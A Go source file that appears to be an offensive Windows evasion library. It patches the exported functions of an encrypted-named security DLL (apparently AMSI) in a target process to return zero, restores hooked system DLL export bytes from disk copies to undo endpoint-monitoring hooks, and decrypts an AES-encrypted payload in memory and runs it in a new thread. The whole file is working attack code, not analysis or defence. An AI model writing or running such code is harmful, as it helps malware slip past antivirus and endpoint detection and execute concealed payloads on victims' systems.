package lib

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"fmt"
	"os"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
	PROCESS_ALL_ACCESS               = 0x1F0FFF
	IMAGE_SIZEOF_SHORT_NAME          = 8

	MEM_COMMIT  = 0x00001000
	MEM_RESERVE = 0x00002000

	ProcessBasicInformation = iota

	Key = "powerGopowerGooo"
)

var (
	StringDllName = []byte{25, 102, 18, 152, 142, 127, 72, 220, 60, 41, 69, 27, 132, 159, 249, 117, 241, 113, 74, 193, 9, 13, 132, 85}
)

type (
	DWORD     uint32
	LONG      uint32
	WORD      uint16
	BYTE      uint8
	ULONGLONG uint64
)

var (
	psapi                    = syscall.NewLazyDLL("psapi.dll")
	procEnumProcessModules   = psapi.NewProc("EnumProcessModules")
	procGetModuleBaseNameW   = psapi.NewProc("GetModuleBaseNameW")
	procGetModuleInformation = psapi.NewProc("GetModuleInformation")

	ntdll                         = syscall.NewLazyDLL("ntdll.dll")
	procNtQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")

	kernel32               = syscall.NewLazyDLL("kernel32.dll")
	procReadProcessMemory  = kernel32.NewProc("ReadProcessMemory")
	procVirtualProtectEx   = kernel32.NewProc("VirtualProtectEx")
	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	procVirtualAlloc       = kernel32.NewProc("VirtualAlloc")
	createThread           = kernel32.NewProc("CreateThread")
	waitForSingleObject    = kernel32.NewProc("WaitForSingleObject")
	getModuleHandleW       = kernel32.NewProc("GetModuleHandleW")
)

type NTStatus uint32

type ModuleInfo struct {
	BaseOfDll   uintptr
	SizeOfImage DWORD
	EntryPoint  uintptr
}

type PROCESS_BASIC_INFORMATION struct {
	Reserved1       uintptr
	PebBaseAddress  uintptr
	Reserved2       [2]uintptr
	UniqueProcessId uintptr
	Reserved3       uintptr
}

type IMAGE_DOS_HEADER struct { // DOS .EXE header
	E_magic    WORD     // Magic number
	E_cblp     WORD     // Bytes on last page of file
	E_cp       WORD     // Pages in file
	E_crlc     WORD     // Relocations
	E_cparhdr  WORD     // Size of header in paragraphs
	E_minalloc WORD     // Minimum extra paragraphs needed
	E_maxalloc WORD     // Maximum extra paragraphs needed
	E_ss       WORD     // Initial (relative) SS value
	E_sp       WORD     // Initial SP value
	E_csum     WORD     // Checksum
	E_ip       WORD     // Initial IP value
	E_cs       WORD     // Initial (relative) CS value
	E_lfarlc   WORD     // File address of relocation table
	E_ovno     WORD     // Overlay number
	E_res      [4]WORD  // Reserved words
	E_oemid    WORD     // OEM identifier (for E_oeminfo)
	E_oeminfo  WORD     // OEM information; E_oemid specific
	E_res2     [10]WORD // Reserved words
	E_lfanew   LONG     // File address of new exe header
}

type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress DWORD
	Size           DWORD
}

type IMAGE_EXPORT_DIRECTORY struct {
	Characteristics       DWORD
	TimeDateStamp         DWORD
	MajorVersionv         WORD
	MinorVersion          WORD
	Name                  DWORD
	Base                  DWORD
	NumberOfFunctions     DWORD
	NumberOfNames         DWORD
	AddressOfFunctions    DWORD
	AddressOfNames        DWORD
	AddressOfNameOrdinals DWORD
}

type IMAGE_FILE_HEADER struct {
	Machine              WORD
	NumberOfSections     WORD
	TimeDateStamp        DWORD
	PointerToSymbolTable DWORD
	NumberOfSymbols      DWORD
	SizeOfOptionalHeader WORD
	Characteristics      WORD
}

type IMAGE_NT_HEADERS struct {
	Signature      DWORD
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER
}

type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       WORD
	MajorLinkerVersion          BYTE
	MinorLinkerVersion          BYTE
	SizeOfCode                  DWORD
	SizeOfInitializedData       DWORD
	SizeOfUninitializedData     DWORD
	AddressOfEntryPoint         DWORD
	BaseOfCode                  DWORD
	ImageBase                   ULONGLONG
	SectionAlignment            DWORD
	FileAlignment               DWORD
	MajorOperatingSystemVersion WORD
	MinorOperatingSystemVersion WORD
	MajorImageVersion           WORD
	MinorImageVersion           WORD
	MajorSubsystemVersion       WORD
	MinorSubsystemVersion       WORD
	Win32VersionValue           DWORD
	SizeOfImage                 DWORD
	SizeOfHeaders               DWORD
	CheckSum                    DWORD
	Subsystem                   WORD
	DllCharacteristics          WORD
	SizeOfStackReserve          ULONGLONG
	SizeOfStackCommit           ULONGLONG
	SizeOfHeapReserve           ULONGLONG
	SizeOfHeapCommit            ULONGLONG
	LoaderFlags                 DWORD
	NumberOfRvaAndSizes         DWORD
	DataDirectory               [IMAGE_NUMBEROF_DIRECTORY_ENTRIES]IMAGE_DATA_DIRECTORY
}

type IMAGE_OPTIONAL_HEADER struct {
	Magic                       WORD
	MajorLinkerVersion          BYTE
	MinorLinkerVersion          BYTE
	SizeOfCode                  DWORD
	SizeOfInitializedData       DWORD
	SizeOfUninitializedData     DWORD
	AddressOfEntryPoint         DWORD
	BaseOfCode                  DWORD
	ImageBase                   ULONGLONG
	SectionAlignment            DWORD
	FileAlignment               DWORD
	MajorOperatingSystemVersion WORD
	MinorOperatingSystemVersion WORD
	MajorImageVersion           WORD
	MinorImageVersion           WORD
	MajorSubsystemVersion       WORD
	MinorSubsystemVersion       WORD
	Win32VersionValue           DWORD
	SizeOfImage                 DWORD
	SizeOfHeaders               DWORD
	CheckSum                    DWORD
	Subsystem                   WORD
	DllCharacteristics          WORD
	SizeOfStackReserve          ULONGLONG
	SizeOfStackCommit           ULONGLONG
	SizeOfHeapReserve           ULONGLONG
	SizeOfHeapCommit            ULONGLONG
	LoaderFlags                 DWORD
	NumberOfRvaAndSizes         DWORD
	DataDirectory               [IMAGE_NUMBEROF_DIRECTORY_ENTRIES]IMAGE_DATA_DIRECTORY
}

type IMAGE_SECTION_HEADER struct {
	Name                 [IMAGE_SIZEOF_SHORT_NAME]BYTE
	Misc                 DWORD
	VirtualAddress       DWORD
	SizeOfRawData        DWORD
	PointerToRawData     DWORD
	PointerToRelocations DWORD
	PointerToLinenumbers DWORD
	NumberOfRelocations  WORD
	NumberOfLinenumbers  WORD
	Characteristics      DWORD
}

func Go(pid uint32) {
	p, err := syscall.OpenProcess(uint32(PROCESS_ALL_ACCESS), false, uint32(pid))
	if err != nil {
		println(err)
		return
	}
	defer syscall.CloseHandle(p)
	err = findAmki(p)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("===Patch Successfully Applied===")
}

func findAmki(p syscall.Handle) error {
	var moduleInfo ModuleInfo
	modules, err := EnumProcessModules(p, 250000)
	if err != nil {
		return err
	}

	targetModuleB, err := decrypt(string(StringDllName), Key)
	if err != nil {
		return err
	}
	targetModule := string(targetModuleB)

	for _, moduleHandle := range modules {
		if moduleHandle != 0 {
			modulePathUTF16 := make([]uint16, 128)
			err = GetModuleBaseName(p, moduleHandle, &modulePathUTF16[0], uint32(len(modulePathUTF16)))
			if err != nil {
				return err
			}

			modulePath := syscall.UTF16ToString(modulePathUTF16)
			if strings.HasSuffix(modulePath, ".dll") {
				// if "profdll" == modulePath {
				// 	continue
				// }
				fmt.Println(modulePath)
				err = GetModuleInformation(p, moduleHandle, &moduleInfo, uint32(unsafe.Sizeof(moduleInfo)))
				if err != nil {
					return err
				}

				if modulePath == targetModule {
					err = patchAmki(p, moduleInfo)
					if err != nil {
						return err
					}
					continue
				}
				modulePath = `C:\Windows\system32\` + modulePath
				_, err := os.Stat(modulePath)
				if err == nil {
					d, err := findOriginalDll(modulePath)
					if err != nil {
						fmt.Println(err)
						continue
					}
					err = patchDll(p, moduleInfo, d)
					if err != nil {
						fmt.Println(err)
						continue
					}
				}
			}

		}
	}
	return nil
}

func findOriginalDll(dll string) ([][8]byte, error) {
	var r = [][8]byte{}
	pSourceBytes, err := os.ReadFile(dll)
	if err != nil {
		return r, err
	}

	currentProcess, err := syscall.GetCurrentProcess()
	if err != nil {
		return r, err
	}
	defer syscall.CloseHandle(currentProcess)

	var pImageHeader IMAGE_DOS_HEADER
	rdrBytes := bytes.NewReader(pSourceBytes)
	err = binary.Read(rdrBytes, binary.LittleEndian, &pImageHeader)
	if err != nil {
		return r, err
	}

	ntHeaderOffset := pImageHeader.E_lfanew

	var pOldNtHeader = new(IMAGE_NT_HEADERS)
	rdrBytes = bytes.NewReader(pSourceBytes[ntHeaderOffset:])
	err = binary.Read(rdrBytes, binary.LittleEndian, pOldNtHeader)
	if err != nil {
		return r, err
	}

	pImageBase := VirtualAlloc(uintptr(0), int(pOldNtHeader.OptionalHeader.SizeOfImage), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)

	WriteProcessMemory(currentProcess, pImageBase, &pSourceBytes[0], uintptr(pOldNtHeader.OptionalHeader.SizeOfHeaders), nil)

	sectionHeaderOffset := uint16(uintptr(pImageHeader.E_lfanew) + unsafe.Sizeof(IMAGE_NT_HEADERS{}.Signature) + unsafe.Sizeof(IMAGE_NT_HEADERS{}.FileHeader) + unsafe.Sizeof(IMAGE_NT_HEADERS{}.OptionalHeader))
	var sectionHeader IMAGE_SECTION_HEADER
	const sectionHeaderSize = unsafe.Sizeof(sectionHeader)

	for i := WORD(0); i != pOldNtHeader.FileHeader.NumberOfSections; i++ {
		rdrBytes = bytes.NewReader(pSourceBytes[sectionHeaderOffset:])
		err = binary.Read(rdrBytes, binary.LittleEndian, &sectionHeader)
		if err != nil {
			return r, err
		}

		WriteProcessMemory(currentProcess, pImageBase+uintptr(sectionHeader.VirtualAddress), &pSourceBytes[sectionHeader.PointerToRawData], uintptr(sectionHeader.SizeOfRawData), nil)
		sectionHeaderOffset = sectionHeaderOffset + uint16(sectionHeaderSize)
	}

	var exportDir = new(IMAGE_DATA_DIRECTORY)
	s := uintptr(unsafe.Sizeof(exportDir))
	err = ReadProcessMemory(currentProcess, pImageBase+uintptr(ntHeaderOffset)+unsafe.Sizeof(IMAGE_NT_HEADERS{}.Signature)+unsafe.Sizeof(IMAGE_NT_HEADERS{}.FileHeader)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.Magic)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MajorLinkerVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MinorLinkerVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfCode)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfInitializedData)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfUninitializedData)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.AddressOfEntryPoint)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.BaseOfCode)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.ImageBase)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SectionAlignment)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.FileAlignment)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MajorOperatingSystemVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MinorOperatingSystemVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MajorImageVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MinorImageVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MajorSubsystemVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MinorSubsystemVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.Win32VersionValue)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfImage)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfHeaders)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.CheckSum)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.Subsystem)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.DllCharacteristics)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfStackReserve)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfStackCommit)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfHeapReserve)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfHeapCommit)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.LoaderFlags)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.NumberOfRvaAndSizes), (*byte)(unsafe.Pointer(exportDir)), s, nil)
	if err != nil {
		return r, err
	}

	var exporttable = IMAGE_EXPORT_DIRECTORY{}
	s = uintptr(unsafe.Sizeof(exporttable))
	err = ReadProcessMemory(currentProcess, pImageBase+uintptr(exportDir.VirtualAddress), (*byte)(unsafe.Pointer(&exporttable)), s, nil)
	if err != nil {
		return r, err
	}

	for i := 0; i < int(exporttable.NumberOfFunctions); i++ {
		var nameAddr DWORD
		s = uintptr(unsafe.Sizeof(nameAddr))
		err = ReadProcessMemory(currentProcess, pImageBase+uintptr(exporttable.AddressOfNames)+uintptr(i*4), (*byte)(unsafe.Pointer(&nameAddr)), s, nil)
		if err != nil {
			return r, err
		}

		var funcAddr DWORD
		s = uintptr(unsafe.Sizeof(funcAddr))
		err = ReadProcessMemory(currentProcess, pImageBase+uintptr(exporttable.AddressOfFunctions)+uintptr((i+1)*4), (*byte)(unsafe.Pointer(&funcAddr)), s, nil)
		if err != nil {
			return r, err
		}

		var asm [8]byte
		s = uintptr(unsafe.Sizeof(asm))
		err = ReadProcessMemory(currentProcess, pImageBase+uintptr(funcAddr), &asm[0], s, nil)
		if err != nil {
			return r, err
		}
		// name := windows.BytePtrToString((*byte)(unsafe.Pointer(pImageBase + uintptr(nameAddr))))
		r = append(r, asm)
	}
	// err = windows.VirtualFree(pImageBase, uintptr(pOldNtHeader.OptionalHeader.SizeOfImage), 0x00000002)
	// if err != nil {
	// 	panic(err)
	// }
	return r, nil
}

func patchDll(p syscall.Handle, a ModuleInfo, originalData [][8]byte) error {
	var pbi PROCESS_BASIC_INFORMATION
	err := NtQueryInformationProcess(p, ProcessBasicInformation, unsafe.Pointer(&pbi), uint32(unsafe.Sizeof(pbi)), nil)
	if err != nil {
		return err
	}

	var pImageHeader IMAGE_DOS_HEADER
	s := uintptr(unsafe.Sizeof(pImageHeader))
	err = ReadProcessMemory(p, a.BaseOfDll, (*byte)(unsafe.Pointer(&pImageHeader)), s, nil)
	if err != nil {
		return err
	}

	ntHeaderOffset := pImageHeader.E_lfanew

	var exportDir = new(IMAGE_DATA_DIRECTORY)
	s = uintptr(unsafe.Sizeof(exportDir))
	err = ReadProcessMemory(p, a.BaseOfDll+uintptr(ntHeaderOffset)+unsafe.Sizeof(IMAGE_NT_HEADERS{}.Signature)+unsafe.Sizeof(IMAGE_NT_HEADERS{}.FileHeader)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.Magic)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MajorLinkerVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MinorLinkerVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfCode)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfInitializedData)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfUninitializedData)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.AddressOfEntryPoint)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.BaseOfCode)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.ImageBase)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SectionAlignment)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.FileAlignment)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MajorOperatingSystemVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MinorOperatingSystemVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MajorImageVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MinorImageVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MajorSubsystemVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MinorSubsystemVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.Win32VersionValue)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfImage)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfHeaders)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.CheckSum)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.Subsystem)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.DllCharacteristics)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfStackReserve)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfStackCommit)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfHeapReserve)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfHeapCommit)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.LoaderFlags)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.NumberOfRvaAndSizes), (*byte)(unsafe.Pointer(exportDir)), s, nil)
	if err != nil {
		return err
	}

	var exporttable = IMAGE_EXPORT_DIRECTORY{}
	s = uintptr(unsafe.Sizeof(exporttable))
	err = ReadProcessMemory(p, a.BaseOfDll+uintptr(exportDir.VirtualAddress), (*byte)(unsafe.Pointer(&exporttable)), s, nil)
	if err != nil {
		return err
	}
	count := 0
	for i := 0; i < int(exporttable.NumberOfFunctions); i++ {
		var nameAddr DWORD
		s = uintptr(unsafe.Sizeof(nameAddr))
		err = ReadProcessMemory(p, a.BaseOfDll+uintptr(exporttable.AddressOfNames)+uintptr(i*4), (*byte)(unsafe.Pointer(&nameAddr)), s, nil)
		if err != nil {
			return err
		}

		var funcAddr DWORD
		s = uintptr(unsafe.Sizeof(funcAddr))
		err = ReadProcessMemory(p, a.BaseOfDll+uintptr(exporttable.AddressOfFunctions)+uintptr((i+1)*4), (*byte)(unsafe.Pointer(&funcAddr)), s, nil)
		if err != nil {
			return err
		}

		cmd := []byte{0xE9}
		var asm [8]byte
		s = uintptr(unsafe.Sizeof(asm))
		err = ReadProcessMemory(p, a.BaseOfDll+uintptr(funcAddr), &asm[0], s, nil)
		if err != nil {
			return err
		}
		// name := windows.BytePtrToString((*byte)(unsafe.Pointer(a.BaseOfDll + uintptr(nameAddr))))
		// name, _ := addressToString(p, uintptr(a.BaseOfDll+uintptr(nameAddr)))
		// if name == "FreeLibrary" {
		// 	FreeLibrary = a.BaseOfDll + uintptr(funcAddr)
		// 	fmt.Println(unsafe.Pointer(a.BaseOfDll + uintptr(funcAddr)))
		// }

		if asm[0] == cmd[0] && asm[1] != originalData[i][1] &&
			asm[2] != originalData[i][2] && asm[3] != originalData[i][3] &&
			asm[4] != originalData[i][4] && asm[5] == originalData[i][5] &&
			asm[6] == originalData[i][6] && asm[7] == originalData[i][7] {
			var oldProtect uint32
			count++
			err = VirtualProtectEx(p, a.BaseOfDll+uintptr(funcAddr), uintptr(len(originalData[i])), syscall.PAGE_EXECUTE_READWRITE, &oldProtect)
			if err != nil {
				return err
			}

			err = WriteProcessMemory(p, a.BaseOfDll+uintptr(funcAddr), &originalData[i][0], uintptr(len(originalData[i])), nil)
			if err != nil {
				return err
			}

			err = VirtualProtectEx(p, a.BaseOfDll+uintptr(funcAddr), uintptr(len(originalData[i])), oldProtect, &oldProtect)
			if err != nil {
				return err
			}
			fmt.Println(unsafe.Pointer(a.BaseOfDll+uintptr(funcAddr)), asm)

		}
	}
	return nil
}

func patchAmki(p syscall.Handle, moduleInfo ModuleInfo) error {
	var pbi PROCESS_BASIC_INFORMATION
	err := NtQueryInformationProcess(p, 0, unsafe.Pointer(&pbi), uint32(unsafe.Sizeof(pbi)), nil)
	if err != nil {
		return err
	}

	var pImageHeader IMAGE_DOS_HEADER
	s := uintptr(unsafe.Sizeof(pImageHeader))
	err = ReadProcessMemory(p, moduleInfo.BaseOfDll, (*byte)(unsafe.Pointer(&pImageHeader)), s, nil)
	if err != nil {
		return err
	}

	ntHeaderOffset := pImageHeader.E_lfanew

	var exportDir = new(IMAGE_DATA_DIRECTORY)
	s = uintptr(unsafe.Sizeof(exportDir))
	err = ReadProcessMemory(p, moduleInfo.BaseOfDll+uintptr(ntHeaderOffset)+unsafe.Sizeof(IMAGE_NT_HEADERS{}.Signature)+unsafe.Sizeof(IMAGE_NT_HEADERS{}.FileHeader)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.Magic)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MajorLinkerVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MinorLinkerVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfCode)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfInitializedData)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfUninitializedData)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.AddressOfEntryPoint)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.BaseOfCode)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.ImageBase)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SectionAlignment)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.FileAlignment)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MajorOperatingSystemVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MinorOperatingSystemVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MajorImageVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MinorImageVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MajorSubsystemVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.MinorSubsystemVersion)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.Win32VersionValue)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfImage)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfHeaders)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.CheckSum)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.Subsystem)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.DllCharacteristics)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfStackReserve)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfStackCommit)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfHeapReserve)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.SizeOfHeapCommit)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.LoaderFlags)+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{}.NumberOfRvaAndSizes), (*byte)(unsafe.Pointer(exportDir)), s, nil)
	if err != nil {
		return err
	}

	var exporttable = IMAGE_EXPORT_DIRECTORY{}
	s = uintptr(unsafe.Sizeof(exporttable))
	err = ReadProcessMemory(p, moduleInfo.BaseOfDll+uintptr(exportDir.VirtualAddress), (*byte)(unsafe.Pointer(&exporttable)), s, nil)
	if err != nil {
		return err
	}

	for i := 0; i < int(exporttable.NumberOfFunctions); i++ {
		var nameAddr uint32
		s = uintptr(unsafe.Sizeof(nameAddr))
		err = ReadProcessMemory(p, moduleInfo.BaseOfDll+uintptr(exporttable.AddressOfNames)+uintptr(i*4), (*byte)(unsafe.Pointer(&nameAddr)), s, nil)
		if err != nil {
			return err
		}

		var funcAddr uint32
		s = uintptr(unsafe.Sizeof(funcAddr))
		err = ReadProcessMemory(p, moduleInfo.BaseOfDll+uintptr(exporttable.AddressOfFunctions)+uintptr(i*4), (*byte)(unsafe.Pointer(&funcAddr)), s, nil)
		if err != nil {
			return err
		}

		patch := []byte{0x33, 0xC0, 0xC3} // xor eax,eax; ret
		name, err := AddressToString(p, moduleInfo.BaseOfDll+uintptr(nameAddr))
		if err != nil {
			return err
		}
		fmt.Println(name)

		var oldProtect uint32
		err = VirtualProtectEx(p, moduleInfo.BaseOfDll+uintptr(funcAddr), uintptr(len(patch)), syscall.PAGE_EXECUTE_READWRITE, &oldProtect)
		if err != nil {
			return err
		}

		err = WriteProcessMemory(p, moduleInfo.BaseOfDll+uintptr(funcAddr), &patch[0], uintptr(len(patch)), nil)
		if err != nil {
			return err
		}

		err = VirtualProtectEx(p, moduleInfo.BaseOfDll+uintptr(funcAddr), uintptr(len(patch)), oldProtect, &oldProtect)
		if err != nil {
			return err
		}

	}

	return nil
}

func VirtualAlloc(address uintptr, size int, allocationType uint64, protect uint64) uintptr {
	addr, _, _ := procVirtualAlloc.Call(address, uintptr(size), uintptr(allocationType), uintptr(protect))
	return addr
}

func WriteProcessMemory(process syscall.Handle, baseAddress uintptr, buffer *byte, size uintptr, numberOfBytesWritten *uintptr) (err error) {
	r1, _, e1 := syscall.Syscall6(procWriteProcessMemory.Addr(), 5, uintptr(process), uintptr(baseAddress), uintptr(unsafe.Pointer(buffer)), uintptr(size), uintptr(unsafe.Pointer(numberOfBytesWritten)), 0)
	if r1 == 0 {
		err = e1
	}
	return
}

func VirtualProtectEx(process syscall.Handle, address uintptr, size uintptr, newProtect uint32, oldProtect *uint32) (err error) {
	r1, _, e1 := syscall.Syscall6(procVirtualProtectEx.Addr(), 5, uintptr(process), uintptr(address), uintptr(size), uintptr(newProtect), uintptr(unsafe.Pointer(oldProtect)), 0)
	if r1 == 0 {
		err = e1
	}
	return
}

func AddressToString(p syscall.Handle, addr uintptr) (string, error) {
	count := 0
	text := ""
	var b [1]byte
	for {
		err := ReadProcessMemory(p, addr+uintptr(count), &b[0], 1, nil)
		if err != nil {
			return text, err
		}
		if b[0] == byte(0x00) {
			break
		}
		count++
		text += string(b[0])
	}
	return text, nil
}

func ReadProcessMemory(process syscall.Handle, baseAddress uintptr, buffer *byte, size uintptr, numberOfBytesRead *uintptr) (err error) {
	r1, _, e1 := syscall.Syscall6(procReadProcessMemory.Addr(), 5, uintptr(process), uintptr(baseAddress), uintptr(unsafe.Pointer(buffer)), uintptr(size), uintptr(unsafe.Pointer(numberOfBytesRead)), 0)
	if r1 == 0 {
		err = e1
	}
	return
}

func NtQueryInformationProcess(proc syscall.Handle, procInfoClass int32, procInfo unsafe.Pointer, procInfoLen uint32, retLen *uint32) (ntstatus error) {
	r0, _, e1 := syscall.Syscall6(procNtQueryInformationProcess.Addr(), 5, uintptr(proc), uintptr(procInfoClass), uintptr(procInfo), uintptr(procInfoLen), uintptr(unsafe.Pointer(retLen)), 0)
	if r0 != 0 {
		ntstatus = e1
	}
	return
}

func GetModuleInformation(process syscall.Handle, module syscall.Handle, modinfo *ModuleInfo, cb uint32) (err error) {
	r1, _, e1 := syscall.Syscall6(procGetModuleInformation.Addr(), 4, uintptr(process), uintptr(module), uintptr(unsafe.Pointer(modinfo)), uintptr(cb), 0, 0)
	if r1 == 0 {
		err = e1
	}
	return
}

func GetModuleBaseName(process syscall.Handle, module syscall.Handle, baseName *uint16, size uint32) (err error) {
	r1, _, e1 := syscall.Syscall6(procGetModuleBaseNameW.Addr(), 4, uintptr(process), uintptr(module), uintptr(unsafe.Pointer(baseName)), uintptr(size), 0, 0)
	if r1 == 0 {
		err = e1
	}
	return
}

func EnumProcessModules(hProcess syscall.Handle, nSize uintptr) (modules []syscall.Handle, err error) {
	modules = make([]syscall.Handle, nSize)
	var sizeNeeded uint32 = 0
	ret, _, _ := syscall.Syscall6(procEnumProcessModules.Addr(), 4, uintptr(hProcess), uintptr(unsafe.Pointer(&modules[0])), uintptr(nSize), uintptr(unsafe.Pointer(&sizeNeeded)), 0, 0)
	if ret == 0 {
		return nil, err
	}

	return modules, nil
}

func StarPS(dotCode string) error {
	targetDllB, err := decrypt(string(StringDllName), Key)
	if err != nil {
		return err
	}
	syscall.MustLoadDLL(string(targetDllB))

	// Go(uint32(os.Getpid()))

	// addr := VirtualAlloc(uintptr(0), len(a), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)

	// var outSize uintptr
	currentProcess, err := syscall.GetCurrentProcess()
	if err != nil {
		return err
	}

	var old uint32
	ciphertext := []byte(dotCode)

	err = VirtualProtectEx(currentProcess, uintptr(unsafe.Pointer(&ciphertext[0])), uintptr(len(ciphertext)), syscall.PAGE_EXECUTE_READWRITE, &old)
	if err != nil {
		return err
	}

	key := []byte(Key)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	if len(ciphertext) < aes.BlockSize {
		panic(err)
	}

	iv := ciphertext[:aes.BlockSize]

	ciphertext = ciphertext[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)

	stream.XORKeyStream(ciphertext, ciphertext)

	// err = WriteProcessMemory(currentProcess, addr, &assemblyBytes[0], uintptr(len(assemblyBytes)), &outSize)
	// if err != nil {
	// 	return err
	// }

	thread, _, _ := createThread.Call(0, 0, uintptr(unsafe.Pointer(&ciphertext[0])), uintptr(0), 0, 0)
	for i := 0; i < 10; i++ {
		time.Sleep(1 * time.Second)
		r1, _, _ := getModuleHandleW.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(string(targetDllB)))))
		if r1 != 0 {
			break
		}
	}

	Go(uint32(os.Getpid()))

	_, _, err = waitForSingleObject.Call(thread, syscall.INFINITE)
	return err
}
